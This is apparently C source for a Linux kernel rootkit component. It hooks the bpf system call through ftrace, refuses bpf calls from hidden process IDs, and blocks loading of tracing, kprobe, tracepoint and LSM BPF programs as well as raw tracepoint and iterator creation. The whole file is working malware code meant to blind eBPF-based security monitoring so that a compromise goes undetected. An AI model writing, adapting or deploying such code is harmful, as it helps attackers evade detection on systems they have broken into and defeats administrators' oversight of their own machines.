/*
Minimal experimental version / test 3
 */

#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/bpf_hook.h"

#define BPF_MAP_CREATE          0
#define BPF_MAP_LOOKUP_ELEM     1
#define BPF_MAP_UPDATE_ELEM     2
#define BPF_MAP_DELETE_ELEM     3
#define BPF_MAP_GET_NEXT_KEY    4
#define BPF_PROG_LOAD           5
#define BPF_OBJ_PIN             6
#define BPF_OBJ_GET             7
#define BPF_PROG_ATTACH         8
#define BPF_PROG_DETACH         9
#define BPF_PROG_TEST_RUN       10
#define BPF_PROG_GET_NEXT_ID    11
#define BPF_MAP_GET_NEXT_ID     12
#define BPF_PROG_GET_FD_BY_ID   13
#define BPF_MAP_GET_FD_BY_ID    14
#define BPF_OBJ_GET_INFO_BY_FD  15
#define BPF_PROG_QUERY          16
#define BPF_RAW_TRACEPOINT_OPEN 17
#define BPF_BTF_LOAD            18
#define BPF_BTF_GET_FD_BY_ID    19
#define BPF_TASK_FD_QUERY       20
#define BPF_MAP_LOOKUP_AND_DELETE_ELEM 21
#define BPF_MAP_FREEZE          22
#define BPF_BTF_GET_NEXT_ID     23
#define BPF_MAP_LOOKUP_BATCH    24
#define BPF_MAP_LOOKUP_AND_DELETE_BATCH 25
#define BPF_MAP_UPDATE_BATCH    26
#define BPF_MAP_DELETE_BATCH    27
#define BPF_LINK_CREATE         28
#define BPF_LINK_UPDATE         29
#define BPF_LINK_GET_FD_BY_ID   30
#define BPF_LINK_GET_NEXT_ID    31
#define BPF_ENABLE_STATS        32
#define BPF_ITER_CREATE         33
#define BPF_LINK_DETACH         34
#define BPF_PROG_BIND_MAP       35
#define BPF_TOKEN_CREATE        36

#define BPF_PROG_TYPE_KPROBE          2
#define BPF_PROG_TYPE_TRACEPOINT      5
#define BPF_PROG_TYPE_PERF_EVENT      7
#define BPF_PROG_TYPE_RAW_TRACEPOINT  17
#define BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE 24
#define BPF_PROG_TYPE_TRACING         26
#define BPF_PROG_TYPE_LSM             29

#define BPF_TRACE_KPROBE_MULTI        42
#define BPF_TRACE_FENTRY              43
#define BPF_TRACE_FEXIT               44
#define BPF_LSM_MAC                   45
#define BPF_TRACE_ITER                46
#define BPF_LSM_CGROUP                47
#define BPF_TRACE_UPROBE_MULTI        48

#define BPF_LINK_TYPE_RAW_TRACEPOINT  1
#define BPF_LINK_TYPE_TRACING         2
#define BPF_LINK_TYPE_KPROBE_MULTI    6
#define BPF_LINK_TYPE_PERF_EVENT      7

static asmlinkage long (*orig_bpf)(const struct pt_regs *);
static asmlinkage long (*orig_bpf_ia32)(const struct pt_regs *);

notrace static inline bool should_hide_pid_by_int(int pid)
{
    int i;
    if (pid <= 0)
        return false;

    if (hidden_count < 0 || hidden_count > MAX_HIDDEN_PIDS)
        return false;

    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid)
            return true;
    }
    return false;
}

notrace static bool is_tracing_prog_type(u32 prog_type)
{
    switch (prog_type) {
        case BPF_PROG_TYPE_KPROBE:
        case BPF_PROG_TYPE_TRACEPOINT:
        case BPF_PROG_TYPE_PERF_EVENT:
        case BPF_PROG_TYPE_RAW_TRACEPOINT:
        case BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE:
        case BPF_PROG_TYPE_TRACING:
        case BPF_PROG_TYPE_LSM:
            return true;
        default:
            return false;
    }
}

notrace static bool is_tracing_prog_load(union bpf_attr __user *uattr, unsigned int size)
{
    u32 prog_type = 0;

    if (!uattr || size < sizeof(u32))
        return false;

    if (copy_from_user(&prog_type, uattr, sizeof(u32)))
        return true; 

    return is_tracing_prog_type(prog_type);
}

notrace static bool is_tracing_link_create(union bpf_attr __user *uattr, unsigned int size)
{
    struct {
        u32 prog_fd;
        u32 target_fd;
        u32 attach_type;
        u32 flags;
    } link_attr;

    if (!uattr || size < sizeof(link_attr))
        return false;

    if (copy_from_user(&link_attr, uattr, sizeof(link_attr)))
        return true; 

    switch (link_attr.attach_type) {
        case BPF_TRACE_KPROBE_MULTI:
        case BPF_TRACE_FENTRY:
        case BPF_TRACE_FEXIT:
        case BPF_LSM_MAC:
        case BPF_TRACE_ITER:
        case BPF_LSM_CGROUP:
        case BPF_TRACE_UPROBE_MULTI:
            return true;
        default:
            return false;
    }
}

notrace static bool should_block_bpf_cmd(int cmd, union bpf_attr __user *uattr, unsigned int size)
{
    pid_t pid = current->tgid;

    if (pid <= 1)
        return false;
    
    if (should_hide_pid_by_int(pid))
        return true;

    switch (cmd) {
        
        case BPF_RAW_TRACEPOINT_OPEN:

            return true;
        
        case BPF_ITER_CREATE:

            return true;
        
        case BPF_PROG_LOAD:

            return is_tracing_prog_load(uattr, size);
        
        case BPF_LINK_CREATE:

            return is_tracing_link_create(uattr, size);
        
        case BPF_MAP_CREATE:
        case BPF_MAP_LOOKUP_ELEM:
        case BPF_MAP_UPDATE_ELEM:
        case BPF_MAP_DELETE_ELEM:
        case BPF_MAP_GET_NEXT_KEY:
        case BPF_MAP_LOOKUP_AND_DELETE_ELEM:
        case BPF_MAP_FREEZE:
        case BPF_MAP_LOOKUP_BATCH:
        case BPF_MAP_LOOKUP_AND_DELETE_BATCH:
        case BPF_MAP_UPDATE_BATCH:
        case BPF_MAP_DELETE_BATCH:
            
            return false;
        
        case BPF_OBJ_PIN:
        case BPF_OBJ_GET:
            
            return false;
        
        case BPF_PROG_ATTACH:
        case BPF_PROG_DETACH:

            return false;
        
        case BPF_BTF_LOAD:
            
            return false;
        
        case BPF_PROG_TEST_RUN:
            
            return false;
        
        case BPF_ENABLE_STATS:
            
            return false;
        
        case BPF_PROG_BIND_MAP:
           
            return false;
        
        case BPF_LINK_UPDATE:
        case BPF_LINK_DETACH:
           
            return false;
        
        case BPF_TOKEN_CREATE:
            
            return false;
        
        case BPF_PROG_GET_NEXT_ID:
        case BPF_MAP_GET_NEXT_ID:
        case BPF_LINK_GET_NEXT_ID:
        case BPF_BTF_GET_NEXT_ID:
        case BPF_PROG_GET_FD_BY_ID:
        case BPF_MAP_GET_FD_BY_ID:
        case BPF_BTF_GET_FD_BY_ID:
        case BPF_LINK_GET_FD_BY_ID:
        case BPF_OBJ_GET_INFO_BY_FD:
        case BPF_TASK_FD_QUERY:
        case BPF_PROG_QUERY:

            return false;
        
        default:
            
            return false;
    }
}

notrace static asmlinkage long hook_bpf(const struct pt_regs *regs)
{
    int cmd;
    union bpf_attr __user *uattr;
    unsigned int size;

    if (!orig_bpf)
        return -ENOSYS;

    cmd = (int)regs->di;
    uattr = (union bpf_attr __user *)regs->si;
    size = (unsigned int)regs->dx;



    if (should_block_bpf_cmd(cmd, uattr, size)) {
        return -EPERM;
    }

    return orig_bpf(regs);
}

notrace static asmlinkage long hook_bpf_ia32(const struct pt_regs *regs)
{
    int cmd;
    union bpf_attr __user *uattr;
    unsigned int size;

    if (!orig_bpf_ia32)
        return -ENOSYS;

    cmd = (int)regs->bx;
    uattr = (union bpf_attr __user *)regs->cx;
    size = (unsigned int)regs->dx;



    if (should_block_bpf_cmd(cmd, uattr, size)) {
        return -EPERM;
    }

    return orig_bpf_ia32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_bpf", hook_bpf, &orig_bpf),
    HOOK("__ia32_sys_bpf", hook_bpf_ia32, &orig_bpf_ia32),
};

notrace int bpf_hook_init(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void bpf_hook_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
